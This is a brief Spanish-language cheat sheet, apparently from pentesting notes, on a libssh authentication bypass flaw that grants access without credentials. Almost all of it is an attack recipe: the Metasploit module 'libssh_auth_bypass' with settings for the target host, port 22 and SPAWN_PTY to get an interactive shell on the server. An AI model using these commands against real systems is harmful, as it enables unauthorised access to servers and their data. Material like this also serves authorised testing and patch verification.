Vulnerabilidad en libssh que permite autenticación sin credenciales.

• Afecta servidores que usan libssh  
• Permite acceso sin contraseña  
• Puede dar shell directa

```
use auxiliary/scanner/ssh/libssh_auth_bypass
```
	set RHOSTS IP  
	set RPORT 22  
	set SPAWN_PTY true

### SPAWN_PTY
Obtiene una shell interactiva.